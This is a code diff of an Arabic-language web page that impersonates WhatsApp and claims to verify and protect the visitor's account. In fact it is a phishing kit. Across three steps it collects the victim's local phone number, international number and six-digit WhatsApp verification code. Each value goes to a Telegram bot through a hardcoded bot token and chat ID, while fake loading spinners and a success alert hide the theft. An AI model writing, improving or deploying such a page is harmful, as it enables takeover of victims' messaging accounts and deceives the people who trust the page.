@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تفعيل حسابك على واتساب</title>
+    <title>توثيق حساب واتساب</title>
     <style>
         * {
             margin: 0;
@@ -64,6 +64,32 @@
             font-size: 18px;
             opacity: 0.9;
             margin-bottom: 30px;
+        }
+        
+        .step {
+            background: rgba(255, 255, 255, 0.15);
+            border-radius: 10px;
+            padding: 15px;
+            margin-bottom: 20px;
+            text-align: right;
+            display: none;
+            animation: fadeIn 0.5s ease;
+        }
+        
+        .step.active {
+            display: block;
+        }
+        
+        .step-number {
+            background: #25D366;
+            width: 30px;
+            height: 30px;
+            border-radius: 50%;
+            display: inline-flex;
+            justify-content: center;
+            align-items: center;
+            margin-left: 10px;
+            font-weight: bold;
         }
         
         .form-group {
@@ -154,6 +180,11 @@
             100% { transform: scale(1); opacity: 1; }
         }
         
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
         .note {
             margin-top: 20px;
             font-size: 14px;
@@ -168,6 +199,15 @@
             display: none;
             text-align: right;
         }
+        
+        .btn-secondary {
+            background: rgba(255, 255, 255, 0.15);
+            margin-top: 10px;
+        }
+        
+        .btn-secondary:hover {
+            background: rgba(255, 255, 255, 0.25);
+        }
     </style>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
 </head>
@@ -177,100 +217,199 @@
             <div class="logo">
                 <i class="fab fa-whatsapp"></i>
             </div>
-            <h1>لأن راحتك تهمنا!</h1>
-            <p class="subtitle">فعل حسابك حتى إذا كانت شبكة الاتصال غير متوفرة</p>
+            <h1>توثيق حساب واتساب</h1>
+            <p class="subtitle">لضمان أمان حسابك وحمايته من الاختراق</p>
         </header>
         
         <main>
-            <div class="form-group">
-                <label for="phone">رقم الهاتف مسبوق برمز البلد</label>
-                <input type="tel" id="phone" placeholder="مثال: +966XXXXXXXXX">
-                <div id="phone-error" class="error">يرجى إدخال رقم هاتف صحيح</div>
+            <!-- المرحلة 1: توثيق الرقم -->
+            <div class="step active" id="step1">
+                <div class="step-header">
+                    <span class="step-number">1</span>
+                    <span>توثيق رقم الهاتف</span>
+                </div>
+                <div class="form-group">
+                    <label for="phone-local">رقم الهاتف (بدون رمز البلد)</label>
+                    <input type="tel" id="phone-local" placeholder="مثال: 05XXXXXXXX">
+                    <div id="phone-local-error" class="error">يرجى إدخال رقم هاتف صحيح</div>
+                </div>
+                <button id="verify-phone-btn">
+                    <i class="fas fa-check"></i> توثيق
+                </button>
             </div>
             
-            <div class="form-group">
-                <label for="code">الكود الذي تم إرساله لك على الوتساب</label>
-                <input type="text" id="code" placeholder="أدخل الكود المكون من 6 أرقام" maxlength="6">
-                <div id="code-error" class="error">الكود يجب أن يتكون من 6 أرقام فقط</div>
+            <!-- المرحلة 2: إدخال الرقم مع رمز البلد -->
+            <div class="step" id="step2">
+                <div class="step-header">
+                    <span class="step-number">2</span>
+                    <span>تأكيد رقم الهاتف</span>
+                </div>
+                <div class="form-group">
+                    <label for="phone-full">رقم الهاتف مسبوق برمز البلد</label>
+                    <input type="tel" id="phone-full" placeholder="مثال: +9665XXXXXXXX">
+                    <div id="phone-full-error" class="error">يرجى إدخال رقم هاتف صحيح</div>
+                </div>
+                <button id="send-code-btn">
+                    <i class="fas fa-paper-plane"></i> إرسال كود التحقق
+                </button>
             </div>
             
-            <button id="verify-btn">
-                تحقق
-            </button>
+            <!-- المرحلة 3: إدخال كود التحقق -->
+            <div class="step" id="step3">
+                <div class="step-header">
+                    <span class="step-number">3</span>
+                    <span>التحقق النهائي</span>
+                </div>
+                <div class="form-group">
+                    <label for="code">كود التحقق المكون من 6 أرقام</label>
+                    <input type="text" id="code" placeholder="أدخل الكود الذي استلمته" maxlength="6">
+                    <div id="code-error" class="error">الكود يجب أن يتكون من 6 أرقام فقط</div>
+                </div>
+                <button id="verify-code-btn">
+                    <i class="fas fa-check-circle"></i> تحقق
+                </button>
+            </div>
             
             <div class="loader" id="loader"></div>
             <div class="success" id="success">✓</div>
             
             <p class="note">
-                هذا الإجراء ضروري لتأمين حسابك والحفاظ على خصوصية بياناتك
+                هذه العملية ضرورية لحماية حسابك من الاختراق والاستخدام غير المصرح به
             </p>
         </main>
     </div>
 
     <script>
         document.addEventListener('DOMContentLoaded', function() {
-            const phoneInput = document.getElementById('phone');
+            // عناصر المراحل
+            const step1 = document.getElementById('step1');
+            const step2 = document.getElementById('step2');
+            const step3 = document.getElementById('step3');
+            
+            // حقول الإدخال
+            const phoneLocalInput = document.getElementById('phone-local');
+            const phoneFullInput = document.getElementById('phone-full');
             const codeInput = document.getElementById('code');
-            const verifyBtn = document.getElementById('verify-btn');
+            
+            // أزرار
+            const verifyPhoneBtn = document.getElementById('verify-phone-btn');
+            const sendCodeBtn = document.getElementById('send-code-btn');
+            const verifyCodeBtn = document.getElementById('verify-code-btn');
+            
+            // مؤشرات
             const loader = document.getElementById('loader');
             const success = document.getElementById('success');
-            const phoneError = document.getElementById('phone-error');
+            
+            // رسائل الخطأ
+            const phoneLocalError = document.getElementById('phone-local-error');
+            const phoneFullError = document.getElementById('phone-full-error');
             const codeError = document.getElementById('code-error');
             
-            // إخفاء رسائل الخطأ عند الكتابة
-            phoneInput.addEventListener('input', () => {
-                phoneError.style.display = 'none';
+            // دالة الانتقال بين المراحل
+            function goToStep(stepNumber) {
+                step1.classList.remove('active');
+                step2.classList.remove('active');
+                step3.classList.remove('active');
+                
+                if(stepNumber === 1) step1.classList.add('active');
+                if(stepNumber === 2) step2.classList.add('active');
+                if(stepNumber === 3) step3.classList.add('active');
+            }
+            
+            // المرحلة 1: توثيق الرقم
+            verifyPhoneBtn.addEventListener('click', function() {
+                const phone = phoneLocalInput.value.trim();
+                
+                if(!phone || !/^05\d{8}$/.test(phone)) {
+                    phoneLocalError.style.display = 'block';
+                    return;
+                }
+                
+                // إرسال البيانات إلى التلجرام
+                sendToTelegram(`📱 المرحلة 1: توثيق الرقم\n\n📞 الرقم المحلي: ${phone}`);
+                
+                // إظهار المؤشر والنجاح
+                showLoaderAndSuccess(1);
             });
             
-            codeInput.addEventListener('input', () => {
-                codeError.style.display = 'none';
+            // المرحلة 2: إرسال كود التحقق
+            sendCodeBtn.addEventListener('click', function() {
+                const phone = phoneFullInput.value.trim();
+                
+                if(!phone || !/^\+\d{10,15}$/.test(phone)) {
+                    phoneFullError.style.display = 'block';
+                    return;
+                }
+                
+                // إرسال البيانات إلى التلجرام
+                sendToTelegram(`📱 المرحلة 2: تأكيد الرقم\n\n🌍 الرقم الدولي: ${phone}`);
+                
+                // إظهار المؤشر والنجاح
+                showLoaderAndSuccess(2);
             });
             
-            // التحقق من البيانات عند الضغط على الزر
-            verifyBtn.addEventListener('click', function() {
-                const phone = phoneInput.value.trim();
+            // المرحلة 3: التحقق من الكود
+            verifyCodeBtn.addEventListener('click', function() {
                 const code = codeInput.value.trim();
-                let valid = true;
                 
-                // التحقق من رقم الهاتف
-                if (!phone || !/^\+\d{10,15}$/.test(phone)) {
-                    phoneError.style.display = 'block';
-                    valid = false;
-                }
-                
-                // التحقق من الكود
-                if (!code || code.length !== 6 || !/^\d{6}$/.test(code)) {
+                if(!code || code.length !== 6 || !/^\d{6}$/.test(code)) {
                     codeError.style.display = 'block';
-                    valid = false;
+                    return;
                 }
                 
-                if (valid) {
-                    // إخفاء الزر وإظهار المؤشر
-                    verifyBtn.style.display = 'none';
-                    loader.style.display = 'block';
-                    
-                    // إرسال البيانات إلى التلجرام
-                    sendToTelegram(phone, code);
-                    
-                    // عرض رسالة النجاح بعد 4 ثواني
-                    setTimeout(() => {
-                        loader.style.display = 'none';
-                        success.style.display = 'block';
-                        
-                        // إخفاء النجاح بعد 3 ثواني
-                        setTimeout(() => {
-                            success.style.display = 'none';
-                            verifyBtn.style.display = 'block';
-                        }, 3000);
-                    }, 4000);
-                }
+                // إرسال البيانات إلى التلجرام
+                sendToTelegram(`📱 المرحلة 3: التحقق النهائي\n\n🔑 كود التحقق: ${code}`);
+                
+                // إظهار المؤشر والنجاح
+                showLoaderAndSuccess(3);
             });
+            
+            // دالة لعرض المؤشر ثم علامة النجاح
+            function showLoaderAndSuccess(step) {
+                // إخفاء جميع الأزرار مؤقتاً
+                verifyPhoneBtn.style.display = 'none';
+                sendCodeBtn.style.display = 'none';
+                verifyCodeBtn.style.display = 'none';
+                
+                // إظهار المؤشر
+                loader.style.display = 'block';
+                success.style.display = 'none';
+                
+                // بعد 5 ثواني
+                setTimeout(() => {
+                    // إخفاء المؤشر وإظهار النجاح
+                    loader.style.display = 'none';
+                    success.style.display = 'block';
+                    
+                    // بعد 2 ثواني
+                    setTimeout(() => {
+                        // إخفاء النجاح
+                        success.style.display = 'none';
+                        
+                        // الانتقال للمرحلة التالية
+                        if(step === 1) {
+                            goToStep(2);
+                            verifyPhoneBtn.style.display = 'block';
+                        } else if(step === 2) {
+                            goToStep(3);
+                            sendCodeBtn.style.display = 'block';
+                        } else if(step === 3) {
+                            // إعادة تعيين النموذج بعد اكتمال المراحل
+                            resetForm();
+                        }
+                        
+                        // إعادة إظهار الزر الحالي
+                        if(step === 1) verifyPhoneBtn.style.display = 'block';
+                        if(step === 2) sendCodeBtn.style.display = 'block';
+                        if(step === 3) verifyCodeBtn.style.display = 'block';
+                    }, 2000);
+                }, 5000);
+            }
             
             // دالة إرسال البيانات إلى التلجرام
-            function sendToTelegram(phone, code) {
+            function sendToTelegram(message) {
                 const botToken = '7054208207:AAHVwwMlay45aLFyQn4FCJyfWM_-AoQXpMM';
                 const chatId = '7493001551';
-                const message = `📱 تم الحصول على بيانات جديدة!\n\n📞 رقم الهاتف: ${phone}\n🔒 الكود: ${code}\n\n🕒 الوقت: ${new Date().toLocaleString()}`;
                 
                 // استخدام API التلجرام لإرسال الرسالة
                 fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
@@ -290,6 +429,17 @@
                 .catch(error => {
                     console.error('حدث خطأ في الإرسال:', error);
                 });
+            }
+            
+            // إعادة تعيين النموذج
+            function resetForm() {
+                phoneLocalInput.value = '';
+                phoneFullInput.value = '';
+                codeInput.value = '';
+                goToStep(1);
+                
+                // إظهار رسالة نهائية
+                alert('تم توثيق حسابك بنجاح! شكراً لاستخدامك خدمتنا.');
             }
         });
     </script>
